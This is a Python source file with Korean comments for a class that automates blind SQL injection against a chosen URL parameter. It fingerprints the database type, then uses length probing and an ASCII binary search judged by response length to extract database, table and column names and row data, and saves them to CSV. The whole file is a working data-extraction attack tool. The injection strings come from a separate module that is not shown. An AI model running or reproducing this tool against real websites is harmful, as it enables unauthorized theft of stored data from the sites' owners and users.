from SqlRepository import SqlRepository
from Requests import Requests
import csv
import os
from datetime import datetime

class SqlModule:
    sql_repository = None
    requests = None
    def __init__(self, url, param, token):
        self.sql_repository = SqlRepository()
        self.requests = Requests(token)
        self.param = param
        self.url = url + "?" + param + "="
        self.token = token

    def saveToCSV(self, data, filename_prefix, headers=None):
        """데이터를 CSV 파일로 저장하는 메서드"""
        if not data:
            print("저장할 데이터가 없습니다.")
            return
        
        # 타임스탬프를 포함한 파일명 생성
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{filename_prefix}_{timestamp}.csv"
        
        try:
            with open(filename, 'w', newline='', encoding='utf-8-sig') as csvfile:
                writer = csv.writer(csvfile)
                
                # 헤더가 있으면 먼저 작성
                if headers:
                    writer.writerow(headers)
                
                # 데이터 작성
                if isinstance(data, list):
                    if isinstance(data[0], (list, tuple)):
                        # 2차원 리스트인 경우
                        writer.writerows(data)
                    else:
                        # 1차원 리스트인 경우
                        for item in data:
                            writer.writerow([item])
                else:
                    writer.writerow([data])
            
            print(f"\n데이터가 '{filename}' 파일로 저장되었습니다.")
        except Exception as e:
            print(f"\nCSV 파일 저장 중 오류가 발생했습니다: {e}")

    def getDBType(self):
        typeQueries = self.sql_repository.getTypeQueries()
        for db_name, queries in typeQueries.items():
            payload = self.url + queries['text']
            response = self.requests.send_get_request(url = payload)
            if(response.status_code == 200):
                print(f"\n{db_name} 예상됨!\n")
            else:
                print(f"{db_name} 아님.")


    def getDBNames(self):
        max_length=30
        db_len = 0
        for i in range(1, max_length + 1):
            payload = self.url + self.sql_repository.getDBNumQueries(i)
            response = self.requests.send_get_request(url = payload)
            if (len(response.text) < 400):
                print(f"\nDB 이름 길이: {i}\n")
                db_len = i
                break;
        db_name = ""
        MIN_ASCII = 32  
        MAX_ASCII = 126
        for idx in range(1, db_len + 1):
            low = MIN_ASCII
            high = MAX_ASCII
            found_char_ascii = 0
            while low <= high:
                mid = (low + high) // 2
                payload = self.url + self.sql_repository.getDBNameQueries(idx, mid)
                response = self.requests.send_get_request(url = payload)
                if response is None:
                    return db_name
                
                if len(response.text) > 400:
                    low = mid + 1
                else:
                    high = mid - 1
            found_char_ascii = low
            db_name += chr(found_char_ascii)
            
            print(f"{idx} 추출 완료: ASCII {found_char_ascii} -> 문자 '{chr(found_char_ascii)}'")

        print(f"\nDB 이름 추출 완료: {db_name}")
        
        # CSV 저장 여부 확인
        save_csv = input("\nCSV 파일로 저장하시겠습니까? (y/n): ").strip().lower()
        if save_csv == 'y':
            self.saveToCSV([db_name], "db_names", headers=["DB 이름"])

    def getTableNames(self):
        input_db = input("테이블 이름을 추출할 데이터베이스 이름을 입력하세요: ").strip()
        max_length=30
        table_num = 0
        for i in range(1, max_length + 1):
            payload = self.url + self.sql_repository.getTableNumQueries(input_db, i)
            response = self.requests.send_get_request(url = payload)
            if (len(response.text) < 400):
                print(f"\n테이블 갯수: {i}\n")
                table_num = i
                break;

        all_table_names = []
        MIN_ASCII = 32
        MAX_ASCII = 126
        for table_idx in range(table_num): 
            current_table_name = ""
            current_table_len = 0
            print(f"\n--- {table_idx + 1}번째 테이블 이름 추출 시작 (LIMIT {table_idx}, 1) ---")
            max_name_len = 50
            for name_len in range(1, max_name_len + 1):
                payload = self.url + self.sql_repository.getTableNameLengthQueries(input_db, table_idx, name_len)
                response = self.requests.send_get_request(url = payload)
                if (len(response.text) < 400):
                    print(f"테이블 이름 길이: {name_len}")
                    current_table_len = name_len
                    break;
            for char_idx in range(1, current_table_len + 1):
                low = MIN_ASCII
                high = MAX_ASCII
                while low <= high:
                    mid = (low + high) // 2
                    payload = self.url + self.sql_repository.getTableNameQueries(
                        db_name=input_db,
                        table_idx=table_idx,
                        char_idx=char_idx,
                        ascii_value=mid
                    )
                    response = self.requests.send_get_request(url = payload)
                    if response is None:
                        return all_table_names
                    if len(response.text) > 400:
                        low = mid + 1
                    else:
                        high = mid - 1
                found_char_ascii = low
                current_table_name += chr(found_char_ascii)
            all_table_names.append(current_table_name)
            print(f"\n테이블 이름 추출 완료: {current_table_name}\n")
        print(f"모든 테이블 이름: {all_table_names}")
        
        # CSV 저장 여부 확인
        save_csv = input("\nCSV 파일로 저장하시겠습니까? (y/n): ").strip().lower()
        if save_csv == 'y':
            # 테이블 이름을 2차원 리스트로 변환 (각 행에 하나씩)
            table_data = [[name] for name in all_table_names]
            self.saveToCSV(table_data, "table_names", headers=["테이블 이름"])


    def getColumnNames(self):
        input_db = input("테이블 이름을 추출할 데이터베이스 이름을 입력하세요: ").strip()
        input_table = input("컬럼 이름을 추출할 테이블 이름을 입력하세요: ").strip()
        max_length=30
        column_num = 0
        for i in range(1, max_length + 1):
            payload = self.url + self.sql_repository.getColumnNumQueries(input_db, input_table, i)
            response = self.requests.send_get_request(url = payload)
            if (len(response.text) < 400):
                print(f"\n컬럼 갯수: {i}\n")
                column_num = i
                break;

        all_column_names = []
        MIN_ASCII = 32
        MAX_ASCII = 126
        for column_idx in range(column_num): 
            current_column_name = ""
            current_column_len = 0
            print(f"\n--- {column_idx + 1}번째 컬럼 이름 추출 시작 (LIMIT {column_idx}, 1) ---")
            max_name_len = 50
            for name_len in range(1, max_name_len + 1):
                payload = self.url + self.sql_repository.getColumnNameLengthQueries(input_db, input_table, column_idx, name_len)
                response = self.requests.send_get_request(url = payload)
                if (len(response.text) < 400):
                    print(f"컬럼 이름 길이: {name_len}")
                    current_column_len = name_len
                    break;
            for char_idx in range(1, current_column_len + 1):
                low = MIN_ASCII
                high = MAX_ASCII
                while low <= high:
                    mid = (low + high) // 2
                    payload = self.url + self.sql_repository.getColumnNameQueries(
                        db_name=input_db,
                        table_name=input_table,
                        column_idx=column_idx,
                        char_idx=char_idx,
                        ascii_value=mid
                    )
                    response = self.requests.send_get_request(url = payload)
                    if response is None:
                        return all_column_names
                    if len(response.text) > 400:
                        low = mid + 1
                    else:
                        high = mid - 1
                found_char_ascii = low
                current_column_name += chr(found_char_ascii)
            all_column_names.append(current_column_name)
            print(f"\n컬럼 이름 추출 완료: {current_column_name}\n")
        print(f"모든 컬럼 이름: {all_column_names}")
        
        # CSV 저장 여부 확인
        save_csv = input("\nCSV 파일로 저장하시겠습니까? (y/n): ").strip().lower()
        if save_csv == 'y':
            # 컬럼 이름을 2차원 리스트로 변환 (각 행에 하나씩)
            column_data = [[name] for name in all_column_names]
            self.saveToCSV(column_data, "column_names", headers=["컬럼 이름"])


    def getData(self):
        input_table = input("데이터를 추출할 테이블 이름을 입력하세요: ").strip()
        input_column = input("데이터를 추출할 컬럼 이름을 입력하세요: ").strip()
        max_length=100
        data_num = 0
        for i in range(1, max_length + 1):
            payload = self.url + self.sql_repository.getDataNumQueries(input_table, i)
            response = self.requests.send_get_request(url = payload)
            if (len(response.text) < 400):
                print(f"\n데이터 갯수: {i}\n")
                data_num = i
                break;

        all_data = []
        MIN_ASCII = 32
        MAX_ASCII = 126
        for row_idx in range(data_num): 
            current_data = ""
            current_data_len = 0
            print(f"\n--- {row_idx + 1}번째 데이터 추출 시작 (LIMIT {row_idx}, 1) ---")
            max_data_len = 100
            for data_len in range(1, max_data_len + 1):
                payload = self.url + self.sql_repository.getDataLengthQueries(input_table, input_column, row_idx, data_len)
                response = self.requests.send_get_request(url = payload)
                if (len(response.text) < 400):
                    print(f"데이터 길이: {data_len}")
                    current_data_len = data_len
                    break;
            for char_idx in range(1, current_data_len + 1):
                low = MIN_ASCII
                high = MAX_ASCII
                while low <= high:
                    mid = (low + high) // 2
                    payload = self.url + self.sql_repository.getDataQueries(
                        table_name=input_table,
                        column_name=input_column,
                        row_idx=row_idx,
                        char_idx=char_idx,
                        ascii_value=mid
                    )
                    response = self.requests.send_get_request(url = payload)
                    if response is None:
                        return all_data
                    if len(response.text) > 400:
                        low = mid + 1
                    else:
                        high = mid - 1
                found_char_ascii = low
                current_data += chr(found_char_ascii)
            all_data.append(current_data)
            print(f"\n데이터 추출 완료: {current_data}\n")
        print(f"모든 데이터: {all_data}")
        
        # CSV 저장 여부 확인
        save_csv = input("\nCSV 파일로 저장하시겠습니까? (y/n): ").strip().lower()
        if save_csv == 'y':
            # 데이터를 2차원 리스트로 변환 (각 행에 하나씩)
            data_rows = [[data] for data in all_data]
            self.saveToCSV(data_rows, f"data_{input_table}_{input_column}", headers=[f"{input_column} 데이터"])